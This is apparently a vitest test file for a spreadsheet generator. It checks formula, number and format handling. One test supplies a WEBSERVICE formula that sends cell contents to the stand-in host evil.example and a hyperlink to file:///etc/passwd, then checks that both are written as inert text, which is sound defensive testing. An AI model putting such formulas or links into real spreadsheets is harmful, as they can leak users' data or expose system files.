import fs from "fs";
import os from "os";
import path from "path";
import { randomUUID } from "crypto";
import ExcelJS from "exceljs";
import { describe, expect, it } from "vitest";
import { generateXLSX } from "../xlsx-generator";

describe("generateXLSX (generate_spreadsheet)", () => {
  it("writes formula strings as formulas and numeric text as numbers", async () => {
    const dir = path.join(os.tmpdir(), `cowork-xlsx-${randomUUID()}`);
    fs.mkdirSync(dir, { recursive: true });
    const outputPath = path.join(dir, "revenue.xlsx");

    await generateXLSX(outputPath, {
      sheets: [
        {
          name: "Revenue",
          headers: ["Region", "Revenue"],
          rows: [
            ["EMEA", "1200"],
            ["APAC", 800],
            ["Total", "=SUM(B2:B3)"],
            ["Zip", "02134"],
          ],
        },
      ],
    });

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.readFile(outputPath);
    const sheet = workbook.getWorksheet("Revenue")!;
    expect(sheet.getCell("B2").value).toBe(1200);
    expect(sheet.getCell("B3").value).toBe(800);
    expect(sheet.getCell("B4").value).toMatchObject({ formula: "SUM(B2:B3)" });
    expect(sheet.getCell("B5").value).toBe("02134");
    expect(sheet.getCell("B1").value).toBe("Revenue");
  });

  it("writes object and array cells as JSON text, not as ExcelJS formulas or links", async () => {
    const dir = path.join(os.tmpdir(), `cowork-xlsx-${randomUUID()}`);
    fs.mkdirSync(dir, { recursive: true });
    const outputPath = path.join(dir, "objects.xlsx");
    const link = { text: "Invoice", hyperlink: "file:///etc/passwd" };
    const formula = { formula: 'WEBSERVICE("https://evil.example/?"&A1)' };

    await generateXLSX(outputPath, {
      sheets: [
        {
          name: "Cells",
          headers: ["Label", formula] as Any,
          rows: [[link, ["nested", 1]] as Any],
        },
      ],
    });

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.readFile(outputPath);
    const sheet = workbook.getWorksheet("Cells")!;
    expect(sheet.getCell("B1").value).toBe(JSON.stringify(formula));
    expect(sheet.getCell("A2").value).toBe(JSON.stringify(link));
    expect(sheet.getCell("B2").value).toBe('["nested",1]');
  });

  it("saves formula results and applies number formats", async () => {
    const dir = path.join(os.tmpdir(), `cowork-xlsx-${randomUUID()}`);
    fs.mkdirSync(dir, { recursive: true });
    const outputPath = path.join(dir, "totals.xlsx");

    const result = await generateXLSX(outputPath, {
      sheets: [
        {
          name: "Totals",
          headers: ["Item", "Amount"],
          rows: [
            ["Room", "180"],
            ["Snacks", "96.5"],
            ["Total", "=SUM(B2:B3)"],
          ],
          numberFormats: [{ column: "Amount", numFmt: "€#,##0.00" }],
        },
      ],
    });

    expect(result.formulas).toEqual({ computed: 1, uncached: [] });
    expect(result.warnings).toEqual([]);
    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.readFile(outputPath);
    const sheet = workbook.getWorksheet("Totals")!;
    expect(sheet.getCell("B4").value).toEqual({ formula: "SUM(B2:B3)", result: 276.5 });
    expect(sheet.getCell("B4").numFmt).toBe("€#,##0.00");
    expect(sheet.getCell("B1").numFmt).toBeUndefined();
  });
});
